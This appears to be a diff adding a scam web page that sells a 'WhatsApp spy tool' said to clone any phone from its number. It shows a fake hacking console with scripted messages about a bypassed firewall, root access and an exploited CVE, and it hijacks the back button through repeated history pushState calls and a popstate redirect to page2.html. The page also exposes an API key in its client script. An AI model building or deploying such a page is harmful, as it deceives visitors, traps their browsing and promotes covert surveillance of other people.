@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LK-V7-2-Worldwide Edition</title>
+    <!-- Adicionado jQuery para a chamada da API -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="js/local-mocks.js"></script>
+    <style>
+        :root {
+            --primary-color: #008060;
+            --secondary-color: #00a884;
+            --accent-color: #25d366;
+            --light-color: #f0f2f5;
+            --dark-color: #333;
+            --white-color: #fff;
+            --danger-color: #d93025;
+            --warning-bg-color: #FFF9E6;
+            --warning-border-color: #FFEDB2;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --border-radius: 8px;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--light-color);
+            /* New background image, similar to WhatsApp Web */
+            background-image: url('https://cdn.jsdelivr.net/gh/Tulio878/descubre-assets@main/sp-1/img/bg.jpg');
+            background-repeat: repeat;
+            background-size: auto;
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background-color: var(--primary-color);
+            color: var(--white-color);
+            padding: 20px 0;
+            text-align: center;
+            margin-bottom: 30px;
+            border-radius: 0 0 var(--border-radius) var(--border-radius);
+            box-shadow: var(--shadow);
+        }
+
+        header h1 {
+            font-size: 20px;
+            margin-bottom: 5px;
+            font-weight: 400;
+        }
+
+        header h2 {
+            font-size: 24px;
+            color: var(--white-color);
+            font-weight: bold;
+        }
+        
+        .card {
+            background-color: var(--white-color);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+        
+        .card-title {
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 15px;
+            color: var(--primary-color);
+        }
+        
+        .card-content {
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .country-selector-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .country-flag {
+            font-size: 24px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            -webkit-appearance: none;
+        }
+
+        /* Custom styling for the select dropdown */
+        select.form-control {
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 1rem center;
+            background-size: 1em;
+            padding-right: 2.5rem;
+        }
+        
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background-color: var(--accent-color);
+            color: var(--white-color);
+            padding: 12px 20px;
+            border: none;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        
+        .btn:hover {
+            background-color: #22c459;
+            transform: translateY(-2px);
+        }
+
+        .btn:disabled {
+            background-color: #999;
+            cursor: not-allowed;
+        }
+        
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+        
+        .secure-badge img {
+            height: 30px;
+        }
+
+        .count-box {
+            background-color: #f8f8f8;
+            border-radius: var(--border-radius);
+            padding: 15px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .count-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+        
+        .count-text {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px 0;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .security-note {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin: 15px 0;
+        }
+
+        .alert-card {
+            background-color: var(--warning-bg-color);
+            border: 1px solid var(--warning-border-color);
+        }
+
+        .alert-card .card-title {
+            color: var(--danger-color);
+        }
+
+        .alert-card ul {
+            text-align: left;
+            margin: 15px 0 15px 20px;
+            padding: 0;
+        }
+
+        /* Spinner Animation */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--white-color);
+            animation: spin 1s ease-in-out infinite;
+            display: none; /* Hidden by default */
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Console Styles */
+        .console-output {
+            background-color: #1e1e1e;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            height: 250px;
+            overflow-y: auto;
+            font-size: 14px;
+            text-align: left;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            border: 1px solid #333;
+        }
+
+        .console-output p {
+            margin: 0 0 5px;
+        }
+
+        .console-output .success {
+            color: #25d366;
+        }
+        
+        .console-output .error {
+            color: #ff4d4d;
+        }
+        
+        .console-output .warning {
+            color: #f9d71c; /* Amarelo */
+        }
+
+    </style>
+
+
+<script>
+         const link = 'page2.html';
+         
+         function setBackRedirect(url) {
+           let urlBackRedirect = url;
+           urlBackRedirect = urlBackRedirect =
+             urlBackRedirect.trim() +
+             (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+             document.location.search.replace('?', '').toString();
+         
+           history.pushState({}, '', location.href);
+           history.pushState({}, '', location.href);
+           history.pushState({}, '', location.href);
+         
+           window.addEventListener('popstate', () => {
+             console.log('onpopstate', urlBackRedirect);
+             setTimeout(() => {
+               location.href = urlBackRedirect;
+             }, 1);
+           });
+         }
+         
+         setBackRedirect(link);
+</script>
+
+
+ 
+
+
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Congratulations... You've won a</h1>
+            <h2>FREE VERIFICATION</h2>
+        </header>
+        
+        <div class="card" id="main-card">
+            <div class="card-title">
+                Discover suspicious messages, questionable photos, and doubtful locations from any WhatsApp...
+            </div>
+            
+            <div class="card-content">
+                <p>Enter the number you want to verify below</p>
+            </div>
+            
+            <form id="check-form">
+                <div class="form-group country-selector-group">
+                     <span id="country-flag" class="country-flag"></span>
+                     <select id="country-select" class="form-control">
+                        <!-- Country options will be inserted by JavaScript -->
+                     </select>
+                </div>
+                <div class="form-group">
+                    <input type="tel" id="phone-number" class="form-control" placeholder="Enter numbers only" required>
+                </div>
+                
+                <button type="submit" class="btn" id="check-btn">
+                    <span id="btn-text">Access WhatsApp</span>
+                </button>
+            </form>
+            
+            <div class="security-note">
+                Data protected by encryption
+            </div>
+        </div>
+
+        <!-- New Console Card -->
+        <div class="card" id="console-card" style="display: none;">
+            <div class="card-title" id="console-title">Accessing Information...</div>
+            <div id="console-output" class="console-output"></div>
+        </div>
+        
+        <div id="info-section">
+            <div class="secure-badge">
+                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNTYgMjU2Ij48ZGVmcz48c3R5bGU+LmNscy0xe2ZpbGw6IzI1ZDM2Njt9LmNscy0ye2ZpbGw6I2ZmZjt9PC9zdHlsZT48L2RlZnM+PHRpdGxlPlNlY3VyZTwvdGl0bGU+PGNpcmNsZSBjbGFzcz0iY2xzLTEiIGN4PSIxMjgiIGN5PSIxMjgiIHI9IjEyOCIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTEyOCw1Ni45NEE3MS40Niw3MS40NiwwLDAsMSw5OS4yNyw2My40YTE5OS40NSwxOTkuNDUsMCwwLDEtMjkuMDYsMTIuMjRBMTIuNjgsMTIuNjgsMCwwLDAsNjEuMDQsODcuODh2NTEuNzlhMzUuNDMsMzUuNDMsMCwwLDAsMTguMzMsMzFjMTYuMTQsOS4xNywzMi4yOCwxOC4zNCw0OC40MywyNy41MSwxLjgzLDAsMy42Ni0xLjgzLDUuNDktMS44MywxNy45NC0xMCwzNS44OS0yMCw1Mi0zMS42M2EyOS4zMSwyOS4zMSwwLDAsMCwxMy4wNi0yNVY4Ny44OGExMy44LDEzLjgsMCwwLDAtOS4xNy0xMi4yNEExNTYuNzQsMTU2Ljc0LDAsMCwxLDE1Ni44NSw2Myw3MS40Niw3MS40NiwwLDAsMSwxMjgsNTYuOTRabTAsOTEuNTRhMjIuODYsMjIuODYsMCwxLDAtMjIuODYtMjIuODVBMjIuNzEsMjIuNzEsMCwwLDAsMTI4LDE0OC4wOFoiLz48L3N2Zz4=" alt="Security Icon">
+                <span>SECURE</span>
+            </div>
+            
+            <div class="card">
+                <div style="text-align: center; font-weight: bold; margin-bottom: 10px;">How does it work?</div>
+                <p style="font-size: 14px; text-align: center; margin-bottom: 10px;">
+                    It completely clones the person's phone through the phone number; you just need to enter it in the field above and clone
+
+It doesn't matter if the person uses modified WhatsApp or lives far from you, the app clones EVERYTHING
+                </p>
+            </div>
+    
+            <div class="count-box">
+                <div class="count-number" id="user-count">115,466</div>
+                <div class="count-text">People who fell for similar scams</div>
+            </div>
+            
+            <div style="text-align: center; margin: 20px 0;">
+                <div>Tool updated on: <strong id="current-date"></strong></div>
+            </div>
+        </div>
+
+        <footer class="footer">
+            <p>&copy; <span id="current-year"></span> - Digital Center | Spy Tool</p>
+            
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // --- DOM ELEMENTS ---
+            const form = document.getElementById('check-form');
+            const mainCard = document.getElementById('main-card');
+            const consoleCard = document.getElementById('console-card');
+            const consoleOutput = document.getElementById('console-output');
+            const consoleTitle = document.getElementById('console-title');
+            const infoSection = document.getElementById('info-section');
+            const phoneNumberInput = document.getElementById('phone-number');
+            const countrySelect = document.getElementById('country-select');
+            const userCountEl = document.getElementById('user-count');
+            const countryFlagEl = document.getElementById('country-flag');
+            
+            // --- COUNTRY DATA ---
+            const countries = [
+                { name: "United States", code: "+1", flag: "🇺🇸" }, { name: "United Kingdom", code: "+44", flag: "🇬🇧" }, { name: "Afghanistan", code: "+93", flag: "🇦🇫" },
+                { name: "Albania", code: "+355", flag: "🇦🇱" }, { name: "Algeria", code: "+213", flag: "🇩🇿" }, { name: "American Samoa", code: "+1-684", flag: "🇦🇸" },
+                { name: "Andorra", code: "+376", flag: "🇦🇩" }, { name: "Angola", code: "+244", flag: "🇦🇴" }, { name: "Anguilla", code: "+1-264", flag: "🇦🇮" },
+                { name: "Antarctica", code: "+672", flag: "🇦🇶" }, { name: "Antigua and Barbuda", code: "+1-268", flag: "🇦🇬" }, { name: "Argentina", code: "+54", flag: "🇦🇷" },
+                { name: "Armenia", code: "+374", flag: "🇦🇲" }, { name: "Aruba", code: "+297", flag: "🇦🇼" }, { name: "Australia", code: "+61", flag: "🇦🇺" },
+                { name: "Austria", code: "+43", flag: "🇦🇹" }, { name: "Azerbaijan", code: "+994", flag: "🇦🇿" }, { name: "Bahamas", code: "+1-242", flag: "🇧🇸" },
+                { name: "Bahrain", code: "+973", flag: "🇧🇭" }, { name: "Bangladesh", code: "+880", flag: "🇧🇩" }, { name: "Barbados", code: "+1-246", flag: "🇧🇧" },
+                { name: "Belarus", code: "+375", flag: "🇧🇾" }, { name: "Belgium", code: "+32", flag: "🇧🇪" }, { name: "Belize", code: "+501", flag: "🇧🇿" },
+                { name: "Benin", code: "+229", flag: "🇧🇯" }, { name: "Bermuda", code: "+1-441", flag: "🇧🇲" }, { name: "Bhutan", code: "+975", flag: "🇧🇹" },
+                { name: "Bolivia", code: "+591", flag: "🇧🇴" }, { name: "Bosnia and Herzegovina", code: "+387", flag: "🇧🇦" }, { name: "Botswana", code: "+267", flag: "🇧🇼" },
+                { name: "Brazil", code: "+55", flag: "🇧🇷" }, { name: "British Indian Ocean Territory", code: "+246", flag: "🇮🇴" }, { name: "British Virgin Islands", code: "+1-284", flag: "🇻🇬" },
+                { name: "Brunei", code: "+673", flag: "🇧🇳" }, { name: "Bulgaria", code: "+359", flag: "🇧🇬" }, { name: "Burkina Faso", code: "+226", flag: "🇧🇫" },
+                { name: "Burundi", code: "+257", flag: "🇧🇮" }, { name: "Cambodia", code: "+855", flag: "🇰🇭" }, { name: "Cameroon", code: "+237", flag: "🇨🇲" },
+                { name: "Canada", code: "+1", flag: "🇨🇦" }, { name: "Cape Verde", code: "+238", flag: "🇨🇻" }, { name: "Cayman Islands", code: "+1-345", flag: "🇰🇾" },
+                { name: "Central African Republic", code: "+236", flag: "🇨🇫" }, { name: "Chad", code: "+235", flag: "🇹🇩" }, { name: "Chile", code: "+56", flag: "🇨🇱" },
+                { name: "China", code: "+86", flag: "🇨🇳" }, { name: "Christmas Island", code: "+61", flag: "🇨🇽" }, { name: "Cocos Islands", code: "+61", flag: "🇨🇨" },
+                { name: "Colombia", code: "+57", flag: "🇨🇴" }, { name: "Comoros", code: "+269", flag: "🇰🇲" }, { name: "Cook Islands", code: "+682", flag: "🇨🇰" },
+                { name: "Costa Rica", code: "+506", flag: "🇨🇷" }, { name: "Croatia", code: "+385", flag: "🇭🇷" }, { name: "Cuba", code: "+53", flag: "🇨🇺" },
+                { name: "Curacao", code: "+599", flag: "🇨🇼" }, { name: "Cyprus", code: "+357", flag: "🇨🇾" }, { name: "Czech Republic", code: "+420", flag: "🇨🇿" },
+                { name: "Democratic Republic of the Congo", code: "+243", flag: "🇨🇩" }, { name: "Denmark", code: "+45", flag: "🇩🇰" }, { name: "Djibouti", code: "+253", flag: "🇩🇯" },
+                { name: "Dominica", code: "+1-767", flag: "🇩🇲" }, { name: "Dominican Republic", code: "+1-809, +1-829, +1-849", flag: "🇩🇴" }, { name: "East Timor", code: "+670", flag: "🇹🇱" },
+                { name: "Ecuador", code: "+593", flag: "🇪🇨" }, { name: "Egypt", code: "+20", flag: "🇪🇬" }, { name: "El Salvador", code: "+503", flag: "🇸🇻" },
+                { name: "Equatorial Guinea", code: "+240", flag: "🇬🇶" }, { name: "Eritrea", code: "+291", flag: "🇪🇷" }, { name: "Estonia", code: "+372", flag: "🇪🇪" },
+                { name: "Ethiopia", code: "+251", flag: "🇪🇹" }, { name: "Falkland Islands", code: "+500", flag: "🇫🇰" }, { name: "Faroe Islands", code: "+298", flag: "🇫🇴" },
+                { name: "Fiji", code: "+679", flag: "🇫🇯" }, { name: "Finland", code: "+358", flag: "🇫🇮" }, { name: "France", code: "+33", flag: "🇫🇷" },
+                { name: "French Polynesia", code: "+689", flag: "🇵🇫" }, { name: "Gabon", code: "+241", flag: "🇬🇦" }, { name: "Gambia", code: "+220", flag: "🇬🇲" },
+                { name: "Georgia", code: "+995", flag: "🇬🇪" }, { name: "Germany", code: "+49", flag: "🇩🇪" }, { name: "Ghana", code: "+233", flag: "🇬🇭" },
+                { name: "Gibraltar", code: "+350", flag: "🇬🇮" }, { name: "Greece", code: "+30", flag: "🇬🇷" }, { name: "Greenland", code: "+299", flag: "🇬🇱" },
+                { name: "Grenada", code: "+1-473", flag: "🇬🇩" }, { name: "Guam", code: "+1-671", flag: "🇬🇺" }, { name: "Guatemala", code: "+502", flag: "🇬🇹" },
+                { name: "Guernsey", code: "+44-1481", flag: "🇬🇬" }, { name: "Guinea", code: "+224", flag: "🇬🇳" }, { name: "Guinea-Bissau", code: "+245", flag: "🇬🇼" },
+                { name: "Guyana", code: "+592", flag: "🇬🇾" }, { name: "Haiti", code: "+509", flag: "🇭🇹" }, { name: "Honduras", code: "+504", flag: "🇭🇳" },
+                { name: "Hong Kong", code: "+852", flag: "🇭🇰" }, { name: "Hungary", code: "+36", flag: "🇭🇺" }, { name: "Iceland", code: "+354", flag: "🇮🇸" },
+                { name: "India", code: "+91", flag: "🇮🇳" }, { name: "Indonesia", code: "+62", flag: "🇮🇩" }, { name: "Iran", code: "+98", flag: "🇮🇷" },
+                { name: "Iraq", code: "+964", flag: "🇮🇶" }, { name: "Ireland", code: "+353", flag: "🇮🇪" }, { name: "Isle of Man", code: "+44-1624", flag: "🇮🇲" },
+                { name: "Israel", code: "+972", flag: "🇮🇱" }, { name: "Italy", code: "+39", flag: "🇮🇹" }, { name: "Ivory Coast", code: "+225", flag: "🇨🇮" },
+                { name: "Jamaica", code: "+1-876", flag: "🇯🇲" }, { name: "Japan", code: "+81", flag: "🇯🇵" }, { name: "Jersey", code: "+44-1534", flag: "🇯🇪" },
+                { name: "Jordan", code: "+962", flag: "🇯🇴" }, { name: "Kazakhstan", code: "+7", flag: "🇰🇿" }, { name: "Kenya", code: "+254", flag: "🇰🇪" },
+                { name: "Kiribati", code: "+686", flag: "🇰🇮" }, { name: "Kosovo", code: "+383", flag: "🇽🇰" }, { name: "Kuwait", code: "+965", flag: "🇰🇼" },
+                { name: "Kyrgyzstan", code: "+996", flag: "🇰🇬" }, { name: "Laos", code: "+856", flag: "🇱🇦" }, { name: "Latvia", code: "+371", flag: "🇱🇻" },
+                { name: "Lebanon", code: "+961", flag: "🇱🇧" }, { name: "Lesotho", code: "+266", flag: "🇱🇸" }, { name: "Liberia", code: "+231", flag: "🇱🇷" },
+                { name: "Libya", code: "+218", flag: "🇱🇾" }, { name: "Liechtenstein", code: "+423", flag: "🇱🇮" }, { name: "Lithuania", code: "+370", flag: "🇱🇹" },
+                { name: "Luxembourg", code: "+352", flag: "🇱🇺" }, { name: "Macau", code: "+853", flag: "🇲🇴" }, { name: "Macedonia", code: "+389", flag: "🇲🇰" },
+                { name: "Madagascar", code: "+261", flag: "🇲🇬" }, { name: "Malawi", code: "+265", flag: "🇲🇼" }, { name: "Malaysia", code: "+60", flag: "🇲🇾" },
+                { name: "Maldives", code: "+960", flag: "🇲🇻" }, { name: "Mali", code: "+223", flag: "🇲🇱" }, { name: "Malta", code: "+356", flag: "🇲🇹" },
+                { name: "Marshall Islands", code: "+692", flag: "🇲🇭" }, { name: "Mauritania", code: "+222", flag: "🇲🇷" }, { name: "Mauritius", code: "+230", flag: "🇲🇺" },
+                { name: "Mayotte", code: "+262", flag: "🇾🇹" }, { name: "Mexico", code: "+52", flag: "🇲🇽" }, { name: "Micronesia", code: "+691", flag: "🇫🇲" },
+                { name: "Moldova", code: "+373", flag: "🇲🇩" }, { name: "Monaco", code: "+377", flag: "🇲🇨" }, { name: "Mongolia", code: "+976", flag: "🇲🇳" },
+                { name: "Montenegro", code: "+382", flag: "🇲🇪" }, { name: "Montserrat", code: "+1-664", flag: "🇲🇸" }, { name: "Morocco", code: "+212", flag: "🇲🇦" },
+                { name: "Mozambique", code: "+258", flag: "🇲🇿" }, { name: "Myanmar", code: "+95", flag: "🇲🇲" }, { name: "Namibia", code: "+264", flag: "🇳🇦" },
+                { name: "Nauru", code: "+674", flag: "🇳🇷" }, { name: "Nepal", code: "+977", flag: "🇳🇵" }, { name: "Netherlands", code: "+31", flag: "🇳🇱" },
+                { name: "New Caledonia", code: "+687", flag: "🇳🇨" }, { name: "New Zealand", code: "+64", flag: "🇳🇿" }, { name: "Nicaragua", code: "+505", flag: "🇳🇮" },
+                { name: "Niger", code: "+227", flag: "🇳🇪" }, { name: "Nigeria", code: "+234", flag: "🇳🇬" }, { name: "Niue", code: "+683", flag: "🇳🇺" },
+                { name: "North Korea", code: "+850", flag: "🇰🇵" }, { name: "Northern Mariana Islands", code: "+1-670", flag: "🇲🇵" }, { name: "Norway", code: "+47", flag: "🇳🇴" },
+                { name: "Oman", code: "+968", flag: "🇴🇲" }, { name: "Pakistan", code: "+92", flag: "🇵🇰" }, { name: "Palau", code: "+680", flag: "🇵🇼" },
+                { name: "Palestine", code: "+970", flag: "🇵🇸" }, { name: "Panama", code: "+507", flag: "🇵🇦" }, { name: "Papua New Guinea", code: "+675", flag: "🇵🇬" },
+                { name: "Paraguay", code: "+595", flag: "🇵🇾" }, { name: "Peru", code: "+51", flag: "🇵🇪" }, { name: "Philippines", code: "+63", flag: "🇵🇭" },
+                { name: "Pitcairn", code: "+64", flag: "🇵🇳" }, { name: "Poland", code: "+48", flag: "🇵🇱" }, { name: "Portugal", code: "+351", flag: "🇵🇹" },
+                { name: "Puerto Rico", code: "+1-787, +1-939", flag: "🇵🇷" }, { name: "Qatar", code: "+974", flag: "🇶🇦" }, { name: "Republic of the Congo", code: "+242", flag: "🇨🇬" },
+                { name: "Reunion", code: "+262", flag: "🇷🇪" }, { name: "Romania", code: "+40", flag: "🇷🇴" }, { name: "Russia", code: "+7", flag: "🇷🇺" },
+                { name: "Rwanda", code: "+250", flag: "🇷🇼" }, { name: "Saint Barthelemy", code: "+590", flag: "🇧🇱" }, { name: "Saint Helena", code: "+290", flag: "🇸🇭" },
+                { name: "Saint Kitts and Nevis", code: "+1-869", flag: "🇰🇳" }, { name: "Saint Lucia", code: "+1-758", flag: "🇱🇨" }, { name: "Saint Martin", code: "+590", flag: "🇲🇫" },
+                { name: "Saint Pierre and Miquelon", code: "+508", flag: "🇵🇲" }, { name: "Saint Vincent and the Grenadines", code: "+1-784", flag: "🇻🇨" }, { name: "Samoa", code: "+685", flag: "🇼🇸" },
+                { name: "San Marino", code: "+378", flag: "🇸🇲" }, { name: "Sao Tome and Principe", code: "+239", flag: "🇸🇹" }, { name: "Saudi Arabia", code: "+966", flag: "🇸🇦" },
+                { name: "Senegal", code: "+221", flag: "🇸🇳" }, { name: "Serbia", code: "+381", flag: "🇷🇸" }, { name: "Seychelles", code: "+248", flag: "🇸🇨" },
+                { name: "Sierra Leone", code: "+232", flag: "🇸🇱" }, { name: "Singapore", code: "+65", flag: "🇸🇬" }, { name: "Sint Maarten", code: "+1-721", flag: "🇸🇽" },
+                { name: "Slovakia", code: "+421", flag: "🇸🇰" }, { name: "Slovenia", code: "+386", flag: "🇸🇮" }, { name: "Solomon Islands", code: "+677", flag: "🇸🇧" },
+                { name: "Somalia", code: "+252", flag: "🇸🇴" }, { name: "South Africa", code: "+27", flag: "🇿🇦" }, { name: "South Korea", code: "+82", flag: "🇰🇷" },
+                { name: "South Sudan", code: "+211", flag: "🇸🇸" }, { name: "Spain", code: "+34", flag: "🇪🇸" }, { name: "Sri Lanka", code: "+94", flag: "🇱🇰" },
+                { name: "Sudan", code: "+249", flag: "🇸🇩" }, { name: "Suriname", code: "+597", flag: "🇸🇷" }, { name: "Svalbard and Jan Mayen", code: "+47", flag: "🇸🇯" },
+                { name: "Swaziland", code: "+268", flag: "🇸🇿" }, { name: "Sweden", code: "+46", flag: "🇸🇪" }, { name: "Switzerland", code: "+41", flag: "🇨🇭" },
+                { name: "Syria", code: "+963", flag: "🇸🇾" }, { name: "Taiwan", code: "+886", flag: "🇹🇼" }, { name: "Tajikistan", code: "+992", flag: "🇹🇯" },
+                { name: "Tanzania", code: "+255", flag: "🇹🇿" }, { name: "Thailand", code: "+66", flag: "🇹🇭" }, { name: "Togo", code: "+228", flag: "🇹🇬" },
+                { name: "Tokelau", code: "+690", flag: "🇹🇰" }, { name: "Tonga", code: "+676", flag: "🇹🇴" }, { name: "Trinidad and Tobago", code: "+1-868", flag: "🇹🇹" },
+                { name: "Tunisia", code: "+216", flag: "🇹🇳" }, { name: "Turkey", code: "+90", flag: "🇹🇷" }, { name: "Turkmenistan", code: "+993", flag: "🇹🇲" },
+                { name: "Turks and Caicos Islands", code: "+1-649", flag: "🇹🇨" }, { name: "Tuvalu", code: "+688", flag: "🇹🇻" }, { name: "U.S. Virgin Islands", code: "+1-340", flag: "🇻🇮" },
+                { name: "Uganda", code: "+256", flag: "🇺🇬" }, { name: "Ukraine", code: "+380", flag: "🇺🇦" }, { name: "United Arab Emirates", code: "+971", flag: "🇦🇪" },
+                { name: "Uruguay", code: "+598", flag: "🇺🇾" }, { name: "Uzbekistan", code: "+998", flag: "🇺🇿" }, { name: "Vanuatu", code: "+678", flag: "🇻🇺" },
+                { name: "Vatican", code: "+379", flag: "🇻🇦" }, { name: "Venezuela", code: "+58", flag: "🇻🇪" }, { name: "Vietnam", code: "+84", flag: "🇻🇳" },
+                { name: "Wallis and Futuna", code: "+681", flag: "🇼🇫" }, { name: "Western Sahara", code: "+212", flag: "🇪🇭" }, { name: "Yemen", code: "+967", flag: "🇾🇪" },
+                { name: "Zambia", code: "+260", flag: "🇿🇲" }, { name: "Zimbabwe", code: "+263", flag: "🇿🇼" }
+            ];
+            
+            function updateFlag() {
+                const selectedCode = countrySelect.value;
+                const selectedCountry = countries.find(c => c.code === selectedCode);
+                if (selectedCountry) {
+                    countryFlagEl.textContent = selectedCountry.flag;
+                }
+            }
+
+            // --- INITIALIZATION ---
+            
+            // Populate the country selector
+            countries.forEach(country => {
+                const option = document.createElement('option');
+                option.value = country.code;
+                option.textContent = `${country.name} (${country.code})`;
+                countrySelect.appendChild(option);
+            });
+            countrySelect.value = '+1'; // Set United States as default
+            updateFlag(); // Set initial flag
+
+            // Set current date and year
+            const today = new Date();
+            const dateOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+            document.getElementById('current-date').textContent = today.toLocaleDateString('en-US', dateOptions);
+            document.getElementById('current-year').textContent = today.getFullYear();
+            
+            animateCounter(userCountEl, 95168, 2000);
+
+            // --- FUNCTIONS ---
+            function animateCounter(element, target, duration) {
+                const start = target > 1000 ? target - 1000 : 0;
+                const range = target - start;
+                let current = start;
+                const increment = target > start ? 1 : -1;
+                const stepTime = Math.abs(Math.floor(duration / range));
+                
+                const timer = setInterval(() => {
+                    current += increment * (Math.floor(Math.random() * 20) + 1);
+                    if (current > target) current = target;
+                    element.textContent = current.toLocaleString('en-US');
+                    if (current === target) clearInterval(timer);
+                }, stepTime > 0 ? stepTime : 1);
+            }
+
+            function resetUI() {
+                mainCard.style.display = 'block';
+                infoSection.style.display = 'block';
+                consoleCard.style.display = 'none';
+                phoneNumberInput.value = '';
+                consoleTitle.textContent = "Accessing Information...";
+            }
+            
+            function addLog(text, className) {
+                const p = document.createElement('p');
+                p.textContent = `> ${text}`;
+                if(className) p.classList.add(className);
+                consoleOutput.appendChild(p);
+                consoleOutput.scrollTop = consoleOutput.scrollHeight;
+            }
+
+            function runHackingSequence() {
+                const logMessages = [
+                    {text: "Connecting to global cellular network...", delay: 900},
+                    {text: "Bypassing provider firewall...", delay: 1400},
+                    {text: "[SUCCESS] Firewall bypassed.", className: 'success'},
+                    {text: "Establishing encrypted channel...", delay: 900},
+                    {text: "Accessing device OS kernel..."},
+                    {text: "Exploiting vulnerability CVE-2025-0777...", delay: 1900},
+                    {text: "[SUCCESS] Root access granted.", className: 'success'},
+                    {text: "All data retrieved. Access complete.", delay: 800}
+                ];
+
+                let i = 0;
+                function printLog() {
+                    if (i < logMessages.length) {
+                        const log = logMessages[i];
+                        addLog(log.text, log.className);
+                        i++;
+                        setTimeout(printLog, log.delay || Math.random() * 500 + 200);
+                    } else {
+                        consoleTitle.textContent = "Access Complete!";
+                        const fullPhoneNumber = countrySelect.value.replace('+', '') + phoneNumberInput.value;
+                        setTimeout(() => {
+                            window.location.href = `page2.html?phone=${fullPhoneNumber}`;
+                        }, 1500);
+                    }
+                }
+                printLog();
+            }
+
+            function startVerification() {
+                // Prepara a UI para a simulação
+                mainCard.style.display = 'none';
+                infoSection.style.display = 'none';
+                consoleCard.style.display = 'block';
+                consoleOutput.innerHTML = ''; 
+
+                const countryCode = countrySelect.value;
+                const localNumber = phoneNumberInput.value;
+                // A API precisa do número sem o '+'
+                const fullNumberForApi = countryCode.replace('+', '') + localNumber;
+                
+                addLog("Initializing secure connection...");
+                addLog(`Target number identified: ${countryCode} ${localNumber}`);
+                addLog("Verifying number with external service...", 'warning');
+
+                var apiKey = 'sgiPfh4j3aXFR3l2CnjWqdKQzxpqGn9pX5b3CUsz';
+                var apiUrl = `https://api.numlookupapi.com/v1/validate/${fullNumberForApi}?apikey=${apiKey}`;
+
+                $.ajax({
+                    url: apiUrl,
+                    method: 'GET',
+                    success: function(response) {
+                        // Verifica se o número é válido
+                        if (response.valid && (response.line_type === 'mobile' || response.line_type ==='landline')){
+                            addLog("[SUCCESS] Number is valid. Proceeding with exploit.", 'success');
+                            setTimeout(runHackingSequence, 1000);
+                        } else {
+                            addLog(`[ERROR] Target number is invalid or unreachable. (Reason: ${response.line_type || 'not a valid number'})`, 'error');
+                            addLog("Aborting operation.");
+                            setTimeout(resetUI, 4000);
+                        }
+                    },
+                    error: function(jqXHR, textStatus, errorThrown) {
+                        addLog("[ERROR] Validation service unreachable. Cannot verify number.", 'error');
+                        addLog(`> Status: ${textStatus}. Error: ${errorThrown}`, 'error');
+                        addLog("Aborting operation.");
+                        setTimeout(resetUI, 4000);
+                    }
+                });
+            }
+
+            // --- EVENT LISTENERS ---
+            countrySelect.addEventListener('change', updateFlag);
+
+            phoneNumberInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            });
+
+            form.addEventListener('submit', function(event) {
+                event.preventDefault();
+                if(phoneNumberInput.value.length > 5) { // Validação mínima
+                    startVerification();
+                } else {
+                    alert("Please enter a valid phone number.");
+                }
+            });
+        });
+    </script>
+</body>
+</html>
